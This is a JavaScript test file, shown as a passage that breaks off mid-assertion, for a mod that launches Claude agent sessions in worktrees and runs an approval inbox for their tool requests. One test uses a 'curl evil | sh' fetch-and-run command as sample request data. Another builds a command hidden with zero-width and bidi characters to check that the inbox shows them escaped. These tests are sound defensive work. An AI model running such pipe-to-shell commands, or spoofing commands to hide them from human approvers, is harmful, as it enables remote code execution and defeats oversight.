    "https://github.com/northwind/orders/issues/12\n#15\n  20 \n\nhttps://github.com/northwind/orders/pull/42\nhttps://github.com/x/y/issues/1\nfix the login",
    { ...ORDERS, host: "github.com", mode: "github" },
    WAY,
  );
  deepStrictEqual(
    rows.map((row) => [row.kind, row.label, row.value ?? row.action]),
    [
      ["item", "orders#12", "https://github.com/northwind/orders/issues/12"],
      ["item", "orders#15", "https://github.com/northwind/orders/issues/15"],
      ["item", "orders#20", "https://github.com/northwind/orders/issues/20"],
      ["skip", "orders#42", "a pull request: review it in Review"],
      ["skip", "y#1", "another repository: start it from its forge"],
      ["skip", "fix the login", "not an issue URL or number"],
    ],
  );
  strictEqual(rows[0].action, "worktree · /forgerdr:worktree");
  strictEqual(
    workRows("#7", { ...GITLAB, mode: "gitlab" }, WAY)[0].value,
    "https://gitlab.example.com/shop/web/storefront/-/issues/7",
  );
  // Issues on GitLab for code on GitHub: numbers go to the GitLab project, a GitHub issue is another repository's.
  const split = workRows(
    "#7\nhttps://github.com/northwind/orders/issues/3",
    {
      ...ORDERS,
      backlog: "https://gitlab.example.com/shop/web/storefront",
      host: "github.com",
      mode: "gitlab",
    },
    WAY,
  );
  deepStrictEqual(
    split.map((row) => [row.kind, row.value ?? row.action]),
    [
      ["item", "https://gitlab.example.com/shop/web/storefront/-/issues/7"],
      ["skip", "another repository: start it from its forge"],
    ],
  );
  // An issue given twice starts once.
  strictEqual(
    workRows(
      "#15\nhttps://github.com/northwind/orders/issues/15",
      { ...ORDERS, host: "github.com", mode: "github" },
      WAY,
    ).length,
    1,
  );
});

test("an Azure DevOps forge's work: its work items by URL or id", () => {
  const rows = workRows(
    "1234\nAB#1240\nhttps://dev.azure.com/other/X/_workitems/edit/9\nhttps://github.com/a/b/issues/1",
    { ...SHOP, backlog: "https://dev.azure.com/other/Backlog", mode: "azure" },
    { dev: true, flow: "auto", where: "here" },
  );
  deepStrictEqual(
    rows.map((row) => [row.kind, row.label, row.value ?? row.action]),
    [
      [
        "item",
        "AB#1234",
        "https://dev.azure.com/other/Backlog/_workitems/edit/1234",
      ],
      [
        "item",
        "AB#1240",
        "https://dev.azure.com/other/Backlog/_workitems/edit/1240",
      ],
      ["item", "AB#9", "https://dev.azure.com/other/X/_workitems/edit/9"],
      ["skip", "b#1", "not a work item URL or id"],
    ],
  );
  strictEqual(rows[0].action, "here · /forgerdr:workitem --auto");
});

test("a review takes pull requests of any provider, whatever the forge's mode", () => {
  deepStrictEqual(
    reviewRows(
      "https://dev.azure.com/acme/Shop/_git/Check.Out/pullrequest/4242\nhttps://github.com/a/b/pull/3\nhttps://github.com/a/b/issues/3\nhello",
    ).map((row) => [row.kind, row.label, row.action]),
    [
      ["pr", "Check.Out#4242", "review · /forgerdr:review"],
      ["pr", "b#3", "review · /forgerdr:review"],
      ["skip", "b#3", "not a pull request: start it in the work tab"],
      ["skip", "hello", "not a supported URL"],
    ],
  );
});

test("what starts: one session for the work, one tab of reviews", () => {
  const work = [
    ...changeRows(["add-inbox"], {
      dev: true,
      flow: "auto",
      where: "worktrees",
    }),
    ...workRows(
      "#12\nnope",
      { ...ORDERS, host: "github.com", mode: "github" },
      WAY,
    ),
  ];
  deepStrictEqual(work[0], {
    action: "worktree · /forgerdr:worktree --auto",
    kind: "change",
    label: "add-inbox",
    value: "add-inbox",
  });
  deepStrictEqual(
    startLaunches(
      [...work, ...reviewRows("https://github.com/northwind/orders/pull/42")],
      { dev: true, flow: "auto", where: "worktrees" },
      "/p/bin/forge-prompt.sh",
      "forgerdr-dev",
    ),
    [
      {
        argv: [
          "claude",
          "/forgerdr:worktree --auto add-inbox | https://github.com/northwind/orders/issues/12",
        ],
        name: "forgerdr worktree",
      },
      {
        argv: [
          "bash",
          "/p/bin/forge-prompt.sh",
          "review",
          "--mod",
          "forgerdr-dev",
          "https://github.com/northwind/orders/pull/42",
        ],
        name: "forgerdr review",
      },
    ],
  );
  deepStrictEqual(
    startLaunches(
      changeRows(["a"], { dev: true, flow: "manual", where: "here" }),
      { dev: true, flow: "manual", where: "here" },
      "/p",
    ),
    [{ argv: ["claude", "/forgerdr:workitem a"], name: "forgerdr workitem" }],
  );
  deepStrictEqual(startLaunches([], WAY, "/p"), []);
});

test("worktrees start their dev servers unless told not to", () => {
  const off = { dev: false, flow: "auto", where: "worktrees" };
  deepStrictEqual(
    changeRows(["a"], off)[0]?.action,
    "worktree · /forgerdr:worktree --auto --no-dev",
  );
  deepStrictEqual(startLaunches(changeRows(["a"], off), off, "/p"), [
    {
      argv: ["claude", "/forgerdr:worktree --auto --no-dev a"],
      name: "forgerdr worktree",
    },
  ]);
  deepStrictEqual(ideaLaunches(["Lanes overflow"], { ...off, spec: false }), [
    {
      argv: ["claude", "/forgerdr:worktree --auto --no-dev Lanes overflow"],
      name: "forgerdr worktree",
    },
  ]);
  const here = { dev: false, flow: "manual", where: "here" };
  deepStrictEqual(startLaunches(changeRows(["a"], here), here, "/p"), [
    { argv: ["claude", "/forgerdr:workitem a"], name: "forgerdr workitem" },
  ]);
});

test("ideas start a spec session each, or one session that works them", () => {
  const ideas = [
    "Remember each pane's zoom | across restarts\nand reset it",
    "Lanes overflow",
  ];
  deepStrictEqual(
    ideaLaunches(ideas, {
      dev: true,
      flow: "manual",
      spec: true,
      where: "here",
    }),
    [
      {
        argv: [
          "env",
          "FORGE_SESSION_TITLE=Remember each pane's zoom / across",
          "claude",
          "/forgerdr:spec Remember each pane's zoom / across restarts and reset it",
        ],
        main: true,
        name: "Remember each pane's zoom / across",
      },
      {
        argv: [
          "env",
          "FORGE_SESSION_TITLE=Lanes overflow",
          "claude",
          "/forgerdr:spec Lanes overflow",
        ],
        main: true,
        name: "Lanes overflow",
      },
    ],
  );
  deepStrictEqual(
    ideaLaunches(ideas.slice(1), {
      dev: true,
      flow: "auto",
      spec: false,
      where: "worktrees",
    }),
    [
      {
        argv: ["claude", "/forgerdr:worktree --auto Lanes overflow"],
        name: "forgerdr worktree",
      },
    ],
  );
  deepStrictEqual(
    ideaLaunches(["  "], {
      dev: true,
      flow: "auto",
      spec: true,
      where: "here",
    }),
    [],
  );
  strictEqual(titleOf("a".repeat(50)), "a".repeat(40));
  strictEqual(titleOf("  short one  "), "short one");
});

const TREE = "/h/.herdr/worktrees/front/fix-#9-crash";

test("a worktree's spaces are those on its folder or inside it, on this machine", () => {
  const space = (id, folder, machine = null) => ({ folder, id, machine });
  deepStrictEqual(
    spacesOn(TREE, [
      space("top", TREE),
      space("in", `${TREE}/src`),
      space("next", `${TREE}-2`),
      space("far", TREE, "box"),
    ]).map((one) => one.id),
    ["top", "in"],
  );
});

test("the panes that close with a worktree: a tab of one by its name, more by each pane's", () => {
  const spaces = [
    {
      id: "sp",
      tabs: [
        { id: "t1", name: "1", named: false, panes: 2 },
        { id: "t2", name: "dev :3001", named: true, panes: 1 },
      ],
    },
  ];
  const panes = [
    { pane: "p1", program: ZSH, tab: "t1", terminal: "a", title: "~/x" },
    { pane: "p2", program: CLAUDE, tab: "t1", terminal: "b", title: "✳ inbox" },
    { pane: "p3", program: VITE, tab: "t2", terminal: "c", title: "pnpm dev" },
    { pane: "p4", program: ZSH, tab: "elsewhere", terminal: "d", title: "" },
  ];
  deepStrictEqual(closingPanes(spaces, panes), [
    { id: "p1", kind: "shell", label: "zsh" },
    { id: "p2", kind: "agent", label: "inbox" },
    { id: "p3", kind: "program", label: "dev :3001" },
  ]);
});

test("the golems at work in a worktree's spaces, theirs and their agents', most urgent first", () => {
  const terminal = (address, status, labels = {}, parent = null) => ({
    address,
    labels,
    parent,
    state: "live",
    status,
    title: `✳ ${address}`,
  });
  const terminals = [
    terminal("main", "working", { "herdr.space": "sp" }),
    terminal("helper", "blocked", { "forge.parent": "main" }),
    terminal("resting", "idle", { "herdr.space": "sp" }),
    terminal("broken", "idle", {
      "forge.state": "cracked",
      "herdr.space": "sp",
    }),
    terminal("other", "working", { "herdr.space": "elsewhere" }),
    {
      ...terminal("gone", "working", { "herdr.space": "sp" }),
      state: "finished",
    },
  ];
  deepStrictEqual(golemsAtWork(["sp"], terminals), [
    { id: "helper", name: "helper", status: "blocked" },
    { id: "main", name: "main", status: "working" },
  ]);
  deepStrictEqual(golemsAtWork(["none"], terminals), []);
  // An agent another space's session dispatched into the worktree's space works there too (isolation: "worktree").
  deepStrictEqual(
    golemsAtWork(
      ["sp-tree"],
      [
        terminal("lead", "idle", { "herdr.space": "sp-main" }),
        terminal("isolated", "working", {
          "forge.parent": "lead",
          "herdr.space": "sp-tree",
        }),
      ],
    ),
    [{ id: "isolated", name: "isolated", status: "working" }],
  );
});

test("the terminals whose pane went into a worktree, wherever their space is", () => {
  const panes = [
    { cwd: `${TREE}/src`, terminal: "went" },
    { cwd: "/h/front", terminal: "stayed" },
    { cwd: TREE, terminal: null },
  ];
  deepStrictEqual(terminalsIn(TREE, panes), ["went"]);
});

test("a golem keeps a worktree by its own pane there, not by its space's other panes", () => {
  const terminal = (address, status, labels = {}) => ({
    address,
    labels,
    parent: null,
    state: "live",
    status,
    title: address,
  });
  const terminals = [
    terminal("lead", "working", { "herdr.space": "sp-main" }),
    terminal("went", "working", { "herdr.space": "sp-main" }),
  ];
  deepStrictEqual(golemsAtWork([], terminals, ["went"]), [
    { id: "went", name: "went", status: "working" },
  ]);
});

test("a worktree is removed only as last looked at: no new file, and a plan that answered", () => {
  const known = { branch: "b", changes: ["a.txt"], path: TREE };
  strictEqual(stillRemovable({ state: "ready", value: known }, known), true);
  strictEqual(
    stillRemovable({ state: "ready", value: { ...known, changes: [] } }, known),
    true,
  );
  strictEqual(
    stillRemovable(
      { state: "ready", value: { ...known, changes: ["a.txt", "b.txt"] } },
      known,
    ),
    false,
  );
  strictEqual(
    stillRemovable({ error: "Argument list too long", state: "error" }, known),
    false,
  );
  strictEqual(folderOf(TREE), "/h/.herdr/worktrees/front");
  strictEqual(folderOf("/top"), "/");
});

test("the item a worktree is for: an id or a URL of the forge's backlog, or none", () => {
  const github = {
    ...ORDERS,
    backlog: "",
    host: "github.com",
    mode: "github",
  };
  deepStrictEqual(itemArg("", github), { value: "" });
  deepStrictEqual(itemArg(" #12 ", github), {
    value: "https://github.com/northwind/orders/issues/12",
  });
  deepStrictEqual(itemArg("https://github.com/someone/else/issues/3", github), {
    error: "another repository: start it from its forge",
  });
  deepStrictEqual(
    itemArg("https://github.com/northwind/orders/pull/4", github),
    {
      error: "a pull request: review it in Review",
    },
  );
  const azure = { ...SHOP, backlog: "", host: "dev.azure.com", mode: "azure" };
  deepStrictEqual(itemArg("AB#77", azure), {
    value: "https://dev.azure.com/acme/Shop%20Platform/_workitems/edit/77",
  });
  // Chat and OpenSpec keep no backlog: an id names the branch as it is.
  deepStrictEqual(itemArg("#12", { ...ORDERS, mode: "chat" }), {
    value: "#12",
  });
  // An item of an external backlog, as forgerdr writes its id, in any mode.
  deepStrictEqual(itemArg("EXT-231", { ...ORDERS, mode: "chat" }), {
    value: "EXT-231",
  });
  deepStrictEqual(itemArg("ext-231", azure), { value: "ext-231" });
  deepStrictEqual(itemArg("make it", { ...ORDERS, mode: "chat" }), {
    error: "not an id (#12, AB#12, EXT-12, 12) or an issue or work item URL",
  });
});

test("what forge-worktree.sh is given for a new worktree", () => {
  const form = {
    dev: true,
    item: "#12",
    kind: "feature",
    repo: "/r",
    title: "Empty state",
  };
  deepStrictEqual(worktreeArgs(form, false), [
    "--repo",
    "/r",
    "--no-agent",
    "--kind",
    "feature",
    "--title",
    "Empty state",
    "#12",
  ]);
  deepStrictEqual(worktreeArgs({ ...form, dev: false }, true), [
    "--plan",
    "--repo",
    "/r",
    "--no-agent",
    "--no-dev",
    "--kind",
    "feature",
    "--title",
    "Empty state",
    "#12",
  ]);
});

test("the golems an API error cracked, and the ones it cracked since the last look", () => {
  const terminals = [
    { address: "t1", labels: { "forge.state": "cracked" } },
    { address: "t2", labels: {} },
    { address: "t3" },
    { address: "t4", labels: { "forge.state": "cracked" } },
  ];
  deepStrictEqual([...crackedOf(terminals)], ["t1", "t4"]);
  deepStrictEqual(newlyCracked(new Set(["t1"]), crackedOf(terminals)), ["t4"]);
  // Mended and cracked again, it cracks anew.
  deepStrictEqual(newlyCracked(new Set(["t1", "t4"]), new Set(["t4", "t9"])), [
    "t9",
  ]);
  deepStrictEqual(newlyCracked(new Set(["t1"]), new Set()), []);
});

test("no control is put on a bare icon or picture, where the app never wires a click", () => {
  // The app wires the pointer only on a div, an h_flex, a v_flex or a component such as Button: a control on an svg
  // or an image hears nothing (kit/sprites.js iconButton wraps an icon to click).
  const roles = new URL("../herdr/mods/forgerdr/roles/", import.meta.url);
  const bare = readdirSync(roles)
    .filter((name) => name.endsWith(".js"))
    .flatMap((name) => {
      const source = readFileSync(new URL(name, roles), "utf8");
      return [
        ...source.matchAll(/\b(?:control|clickable)\(\s*(?:icon|svg|image)\(/g),
      ].map((match) => `${name}: ${match[0].replace(/\s+/g, " ")}`);
    });
  deepStrictEqual(bare, []);
});

test("every role the mod has is one main.js can make", () => {
  const roles = new URL("../herdr/mods/forgerdr/roles/", import.meta.url);
  const main = readFileSync(new URL("../main.js", roles), "utf8");
  const missing = readdirSync(roles).filter(
    (name) =>
      name.endsWith(".js") &&
      name !== "role.js" &&
      !main.includes(`"./roles/${name}"`),
  );
  deepStrictEqual(missing, []);
});

// The approval inbox (design 05): requests hooks/inbox.sh wrote, as bin/forge-inbox.sh lists them.
const inboxRequest = (
  id,
  kind,
  created,
  toolName,
  toolInput,
  terminal = "t5",
) => ({
  agent_type: "",
  created,
  cwd: "/work/forge",
  id,
  kind,
  session_id: "s1",
  terminal,
  tool_input: toolInput,
  tool_name: toolName,
});
const zoomQuestion = {
  header: "Zoom",
  multiSelect: false,
  options: [
    { description: "Each pane keeps its own", label: "per pane" },
    { description: "Every pane of a session shares one", label: "per session" },
  ],
  question: "Where should a pane remember its zoom level?",
};
const reposQuestion = {
  header: "Repos",
  multiSelect: true,
  options: [
    { description: "", label: "front" },
    { description: "", label: "back" },
  ],
  question: "Which repositories?",
};

test("what waits is a card each, the newest first; a blocked agent with no request waits in its pane", () => {
  const requests = [
    inboxRequest("a1", "permission", 1000, "Bash", { command: "git push" }),
    inboxRequest(
      "b2",
      "question",
      3000,
      "AskUserQuestion",
      { questions: [zoomQuestion] },
      "t6",
    ),
    inboxRequest(
      "c3",
      "plan",
      2000,
      "ExitPlanMode",
      { plan: "# Wire it" },
      "t9",
    ),
  ];
  const terminals = [
    { address: "t5", state: "live", status: "blocked", status_ms: 900 },
    { address: "t6", state: "live", status: "blocked" },
    {
      address: "t7",
      state: "live",
      status: "blocked",
      status_ms: 2500,
      title: "claude · fix",
    },
    { address: "t8", state: "finished", status: "blocked" },
    { address: "t4", state: "live", status: "working" },
  ];
  const cards = cardsOf(requests, terminals);
  deepStrictEqual(
    cards.map((card) => [card.id, card.kind, card.terminal, card.since]),
    [
      ["b2", INBOX_KIND.question, "t6", 3000],
      ["waiting:t7", INBOX_KIND.waiting, "t7", 2500],
      ["a1", INBOX_KIND.permission, "t5", 1000],
    ],
  );
  strictEqual(cards[2].request, requests[0]);
  strictEqual(cards[1].request, null);
});

test("a session whose request just went is not shown waiting in its pane while the app catches up", () => {
  const terminals = [
    { address: "t5", state: "live", status: "blocked" },
    { address: "t7", state: "live", status: "blocked" },
  ];
  deepStrictEqual(
    cardsOf([], terminals, { quiet: new Set(["t5"]) }).map((card) => card.id),
    ["waiting:t7"],
  );
  deepStrictEqual(
    cardsOf(
      [inboxRequest("a1", "permission", 1, "Bash", { command: "ls" })],
      terminals,
      { quiet: new Set(["t5"]) },
    ).map((card) => card.id),
    ["a1", "waiting:t7"],
  );
});

test("a session is quiet for a moment after its request goes, then it can be shown waiting again", () => {
  const before = [
    inboxRequest("a1", "permission", 1, "Bash", { command: "ls" }, "t5"),
    inboxRequest("b2", "permission", 2, "Bash", { command: "pwd" }, "t6"),
  ];
  const quiet = quietAfter(new Map(), before, [before[1]], 10_000);
  deepStrictEqual([...quietNow(quiet, 12_000)], ["t5"]);
  deepStrictEqual([...quietNow(quiet, 13_500)], []);
  deepStrictEqual(
    [...quietNow(quietAfter(quiet, [before[1]], [], 14_000), 14_500)],
    ["t6"],
  );
});

test("an agent has waited in its pane since the inbox first saw it blocked, never since its terminal started", () => {
  const terminals = [
    { address: "t5", created_ms: 1000, state: "live", status: "blocked" },
    { address: "t7", created_ms: 1000, state: "live", status: "blocked" },
    {
      address: "t8",
      created_ms: 1000,
      state: "live",
      status: "blocked",
      status_ms: 4000,
    },
  ];
  const cards = cardsOf([], terminals, {
    now: 9000,
    seen: new Map([["t5", 7000]]),
  });
  deepStrictEqual(
    cards.map((card) => [card.terminal, card.since]),
    [
      ["t7", 9000],
      ["t5", 7000],
      ["t8", 4000],
    ],
  );
});

test("each filter counts its kind; all counts everything, the agents waiting in their panes too", () => {
  const cards = cardsOf(
    [
      inboxRequest("a1", "permission", 1, "Bash", { command: "ls" }),
      inboxRequest("a2", "permission", 2, "Write", { file_path: "/x" }),
      inboxRequest("g1", "gate", 3, "AskUserQuestion", { questions: [] }),
    ],
    [
      { address: "t5", state: "live", status: "blocked" },
      { address: "t7", state: "live", status: "blocked" },
    ],
  );
  deepStrictEqual(countsOf(cards), {
    [FILTER.all]: 4,
    [FILTER.gates]: 1,
    [FILTER.permissions]: 2,
    [FILTER.plans]: 0,
    [FILTER.questions]: 0,
  });
  deepStrictEqual(
    shownIn(cards, FILTER.permissions).map((card) => card.id),
    ["a2", "a1"],
  );
  strictEqual(shownIn(cards, FILTER.all).length, 4);
  deepStrictEqual(FILTER_ORDER, [
    "all",
    "permissions",
    "questions",
    "plans",
    "gates",
  ]);
});

test("a card says what it asks, every field the allow applies and whole: an allow never hides what it runs", () => {
  const summary = (kind, tool, input) =>
    summaryOf(inboxRequest("x", kind, 1, tool, input));
  deepStrictEqual(
    summary("permission", "Bash", {
      command: "git push -u origin HEAD",
      description: "Publish the branch",
    }),
    {
      detail: "cwd /work/forge",
      lead: "git push -u origin HEAD",
      note: "Publish the branch",
    },
  );
  deepStrictEqual(
    summary("permission", "Bash", {
      command: "make deploy",
      dangerouslyDisableSandbox: true,
      description: "Deploy",
      timeout: 600000,
    }).detail,
    "cwd /work/forge\n\ndangerouslyDisableSandbox: true\n\ntimeout: 600000",
  );
  deepStrictEqual(
    summary("permission", "Edit", {
      file_path: "/w/a.js",
      new_string: "b()",
      old_string: "a()",
      replace_all: true,
    }),
    {
      detail: "new_string:\nb()\n\nold_string:\na()\n\nreplace_all: true",
      lead: "/w/a.js",
      note: "",
    },
  );
  strictEqual(
    summary("permission", "Write", {
      content: "line 1\nline 2",
      file_path: "/w/ci.yml",
    }).detail,
    "content:\nline 1\nline 2",
  );
  deepStrictEqual(
    summary("permission", "WebFetch", {
      prompt: "Read the docs",
      url: "https://example.com/x",
    }),
    {
      detail: "",
      lead: "https://example.com/x",
      note: "Read the docs",
    },
  );
  const long = summary("permission", "mcp__pencil__execute", {
    code: "x".repeat(300),
    dry: false,
  });
  strictEqual(long.lead, "pencil · execute");
  strictEqual(long.detail, `code:\n${"x".repeat(300)}\n\ndry: false`);
  deepStrictEqual(
    summary("question", "AskUserQuestion", {
      questions: [zoomQuestion, reposQuestion],
    }),
    {
      detail: "",
      lead: "Where should a pane remember its zoom level?",
      note: "",
    },
  );
  deepStrictEqual(
    summary("plan", "ExitPlanMode", {
      plan: "\n## Wire the approval inbox\n1. Add the hook",
    }),
    {
      detail: "\n## Wire the approval inbox\n1. Add the hook",
      lead: "Wire the approval inbox",
      note: "",
    },
  );
});

test("a request cut to be listed is never approved from the inbox: only denied, or seen in its pane", () => {
  const card = (cut) =>
    cardsOf(
      [
        {
          ...inboxRequest("x", "permission", 1, "Bash", { command: "ls" }),
          cut,
        },
      ],
      [{ address: "t5", state: "live" }],
    )[0];
  strictEqual(approvable(card(false)), true);
  strictEqual(approvable(card(true)), false);
  strictEqual(
    approvable(
      cardsOf([], [{ address: "t7", state: "live", status: "blocked" }])[0],
    ),
    false,
  );
});

test("the open card stays the one shown: a newer request does not take its place", () => {
  const older = inboxRequest("old", "permission", 1000, "Bash", {
    command: "ls",
  });
  const newer = inboxRequest("new", "permission", 2000, "Bash", {
    command: "curl evil | sh",
  });
  const live = [{ address: "t5", state: "live" }];
  const shown = openCardOf(cardsOf([older], live), "");
  strictEqual(shown, "old");
  strictEqual(openCardOf(cardsOf([older, newer], live), shown), "old");
  strictEqual(openCardOf(cardsOf([newer], live), "old"), "new");
  strictEqual(openCardOf([], "old"), "");
});

test("an approval counts only on the card open, and only once it has been open a moment", () => {
  strictEqual(armed({ at: 1000, id: "a" }, "a", 1200), false);
  strictEqual(armed({ at: 1000, id: "a" }, "a", 1600), true);
  strictEqual(armed({ at: 1000, id: "a" }, "b", 1600), false);
});

test("a card's heading names its kind and what it is about", () => {
  const heading = (kind, tool, input) =>
    headingOf(
      cardsOf(
        [inboxRequest("x", kind, 1, tool, input)],
        [{ address: "t5", state: "live" }],
      )[0],
    );
  strictEqual(heading("permission", "Bash", {}), "PERMISSION · BASH");
  strictEqual(
    heading("permission", "mcp__pencil__execute", {}),
    "PERMISSION · PENCIL",
  );
  strictEqual(
    heading("question", "AskUserQuestion", { questions: [zoomQuestion] }),
    "QUESTION · 2 OPTIONS",
  );
  strictEqual(
    heading("gate", "AskUserQuestion", {
      questions: [{ ...zoomQuestion, header: "Gate commit" }],
    }),
    "GATE · COMMIT",
  );
  strictEqual(
    heading("plan", "ExitPlanMode", { plan: "" }),
    "PLAN · EXITPLANMODE",
  );
  strictEqual(
    headingOf(
      cardsOf([], [{ address: "t7", state: "live", status: "blocked" }])[0],
    ),
    "WAITING · IN ITS PANE",
  );
});

test("an option picked answers its question; a multi-select one takes several, in the options' order", () => {
  const questions = [zoomQuestion, reposQuestion];
  strictEqual(answersOf(questions, {}, {}), null);
  let picks = pickOption(questions, {}, 0, 1);
  picks = pickOption(questions, picks, 0, 0);
  deepStrictEqual(picks, { 0: ["per pane"] });
  strictEqual(answersOf(questions, picks, {}), null);
  picks = pickOption(questions, picks, 1, 1);
  picks = pickOption(questions, picks, 1, 0);
  deepStrictEqual(answersOf(questions, picks, {}), {
    "Where should a pane remember its zoom level?": "per pane",
    "Which repositories?": "front, back",
  });
  picks = pickOption(questions, picks, 1, 1);
  deepStrictEqual(picks, { 0: ["per pane"], 1: ["front"] });
  deepStrictEqual(
    answersOf(questions, picks, { 0: "  per pane, reset on restart " }),
    {
      "Where should a pane remember its zoom level?":
        "per pane, reset on restart",
      "Which repositories?": "front",
    },
  );
  deepStrictEqual(answersOf([zoomQuestion], {}, { 0: "global" }), {
    "Where should a pane remember its zoom level?": "global",
  });
  strictEqual(answersOf([zoomQuestion], {}, { 0: "   " }), null);
});

test("each answer is one its request takes, as hooks/inbox.sh checks it", () => {
  deepStrictEqual(permissionAnswer(), { behavior: "allow" });
  deepStrictEqual(denyAnswer("  use pnpm test:unit "), {
    behavior: "deny",
    message: "use pnpm test:unit",
  });
  deepStrictEqual(denyAnswer(""), { behavior: "deny" });
  deepStrictEqual(questionAnswer({ "Which?": "front" }), {
    answers: { "Which?": "front" },
    behavior: "allow",
  });
  deepStrictEqual(planAnswer(PLAN_MODE.auto), {
    behavior: "allow",
    mode: "auto",
  });
  deepStrictEqual(planAnswer(PLAN_MODE.manual), {
    behavior: "allow",
    mode: "default",
  });
});

test("how long a card has waited: minutes and seconds, then hours", () => {
  strictEqual(waitedFor(0, 42_000), "0:42");
  strictEqual(waitedFor(0, 190_000), "3:10");
  strictEqual(waitedFor(0, 8_040_000), "2h 14m");
  strictEqual(waitedFor(0, 18_120_000), "5h 02m");
  strictEqual(waitedFor(5000, 1000), "0:00");
});

test("a card comes from its forge: its gnome and name, then the branch and the session", () => {
  const main = {
    id: "sp1",
    name: "orders",
    tabs: [{ id: "tb1", name: "claude · main" }],
  };
  const worktree = {
    id: "sp2",
    name: "approval-inbox",
    tabs: [
      { id: "tb2", name: "claude · inbox" },
      { id: "tb3", name: "3" },
    ],
  };
  const dotfiles = {
    id: "sp3",
    name: "dotfiles",
    tabs: [{ id: "tb4", name: "claude · fix" }],
  };
  const forges = [
    { key: "/code/orders/.git", main, spaces: [main, worktree] },
    { key: "space:sp3", main: dotfiles, spaces: [dotfiles] },
  ];
  const panes = [
    { branch: "main", tab: "tb1", terminal: "t5" },
    { branch: "feature/#12-approval-inbox", tab: "tb2", terminal: "t6" },
    { branch: null, tab: "tb3", terminal: "t8" },
    { branch: null, tab: "tb4", terminal: "t2" },
  ];
  const origin = (address, terminals = []) => {
    const { forge, path } = originOf(address, forges, panes, terminals);
    return [forge?.key ?? null, path];
  };
  deepStrictEqual(origin("t6"), [
    "/code/orders/.git",
    ["orders", "feature/#12-approval-inbox", "claude · inbox"],
  ]);
  deepStrictEqual(origin("t8"), ["/code/orders/.git", ["orders", "3"]]);
  deepStrictEqual(origin("t2"), ["space:sp3", ["dotfiles", "claude · fix"]]);
  deepStrictEqual(
    origin("t9", [{ address: "t9", parent: "t5", title: "explore" }]),
    ["/code/orders/.git", ["orders", "main", "claude · main", "explore"]],
  );
  deepStrictEqual(origin("t3"), [null, ["t3"]]);
  // Two pane-less agents that name each other as their session do not send it round for ever.
  deepStrictEqual(
    origin("t11", [
      { address: "t11", parent: "t12", title: "one" },
      { address: "t12", parent: "t11", title: "two" },
    ]),
    [null, ["t11", "two", "one"]],
  );
});

test("an answer is stamped gold for a yes and red for a no; a gate's yes is its first option", () => {
  const card = (kind, input) => ({
    id: "x",
    kind,
    request: inboxRequest("x", kind, 1, "AskUserQuestion", input),
    since: 1,
    terminal: "t5",
  });
  const gateQuestion = {
    header: "Gate commit",
    multiSelect: false,
    options: [
      { description: "As drafted", label: "Commit" },
      { description: "Keep working", label: "Not yet" },
    ],
    question: "Commit feat: add the inbox?",
  };
  const gate = card("gate", { questions: [gateQuestion] });
  strictEqual(markOf(card("permission", {}), permissionAnswer()), MARK.yes);
  strictEqual(markOf(card("permission", {}), denyAnswer("no")), MARK.no);
  strictEqual(markOf(card("plan", {}), planAnswer(PLAN_MODE.manual)), MARK.yes);
  strictEqual(markOf(card("plan", {}), denyAnswer("")), MARK.no);
  strictEqual(
    markOf(
      card("question", { questions: [zoomQuestion] }),
      questionAnswer({ [zoomQuestion.question]: "global" }),
    ),
    MARK.yes,
  );
  strictEqual(
    markOf(gate, questionAnswer({ [gateQuestion.question]: "Commit" })),
    MARK.yes,
  );
  strictEqual(
    markOf(gate, questionAnswer({ [gateQuestion.question]: "Not yet" })),
    MARK.no,
  );
  strictEqual(
    markOf(
      gate,
      questionAnswer({ [gateQuestion.question]: "Commit, but squash first" }),
    ),
    MARK.no,
  );
});

test("a card answered says when, on the local clock", () => {
  const at = new Date(2026, 10, 19, 16, 42, 7).getTime();
  strictEqual(markedAt(at), "answered 16:42");
  strictEqual(
    markedAt(new Date(2026, 10, 19, 9, 5).getTime()),
    "answered 09:05",
  );
});

test("what a card shows of a request leaves nothing invisible: zero-width, bidi and control characters are spelt out", () => {
  const hidden = (code) => String.fromCodePoint(code);
  const sneaky =
    `ls${hidden(0x200b)} -la${hidden(0x202e)} txt.exe${hidden(0x7)}TAB_end\nnext`.replace(
      "TAB_",
      "\t",
    );
  const { lead } = summaryOf(
    inboxRequest("x", "permission", 1, "Bash", { command: sneaky }),
  );
  strictEqual(lead, `ls\\u{200B} -la\\u{202E} txt.exe\\u{7}\tend\nnext`);
  strictEqual(
    summaryOf(
      inboxRequest("x", "permission", 1, "Write", {
        content: `a${hidden(0xfeff)}b`,
        file_path: "/w/x",
      }),
    ).detail,
    `content:\na\\u{FEFF}b`,
  );
  const more = [0xad, 0x2028, 0xfe0f, 0xe0101].map(hidden).join("|");
  strictEqual(
    summaryOf(inboxRequest("x", "permission", 1, "Bash", { command: more }))
      .lead,
    "\\u{AD}|\\u{2028}|\\u{FE0F}|\\u{E0101}",
  );
});

test("what shows above the open card is noted, so a card that moved under the pointer is armed again", () => {
  const live = [{ address: "t5", state: "live" }];
  const cards = cardsOf(
    [
      inboxRequest("c", "permission", 3, "Bash", { command: "c" }),
      inboxRequest("b", "permission", 2, "Bash", { command: "b" }),
      inboxRequest("a", "permission", 1, "Bash", { command: "a" }),
    ],
    live,
  );
  strictEqual(aboveOf(cards, "b"), "c");
  strictEqual(aboveOf(cards, "a"), "c b");
  strictEqual(aboveOf(cards, "c"), "");
  strictEqual(aboveOf(cards, "gone"), "");
});

// The forge floor (floor.js): a flow as bin/forge-flow.sh keeps it.
const flowOf = (fields) => ({
  cells: {},
  created: 1,
  key: "#15",
  mode: "auto",
  pr: null,
  repo: "/code/orders/.git",
  tasks: null,
  terminal: "t5",
  title: "inbox keyboard answering",
  type: "feature",
  updated: 1,
  ...fields,
});
const stripText = (strip) =>
  strip.map(({ cell, state, runs }) => `${cell}:${state}:${runs}`);

test("an auto flow shows only the cells its pipeline will run, known beforehand", () => {
  deepStrictEqual(PIPELINE.feature, [
    "brief",
    "spec",
    "research",
    "plan",
    "build",
    "review",
    "security",
    "ship",
  ]);
  deepStrictEqual(PIPELINE.bug, [
    "brief",
    "reproduce",
    "root-cause",
    "proposal",
    "fix",
    "review",
    "security",
    "ship",
  ]);
  deepStrictEqual(PIPELINE.content, ["brief", "verdict", "comment"]);
  deepStrictEqual(PIPELINE.change, [
    "spec",
    "plan",
    "build",
    "review",
    "security",
    "ship",
  ]);
  const flow = flowOf({
    cells: {
      brief: { at: 1, runs: 1, state: "done" },
      spec: { at: 2, runs: 1, state: "running" },
    },
  });
  deepStrictEqual(stripText(stripOf(flow, false)), [
    "brief:done:1",
    "spec:running:1",
    "research:pending:0",
    "plan:pending:0",
    "build:pending:0",
    "review:pending:0",
    "security:pending:0",
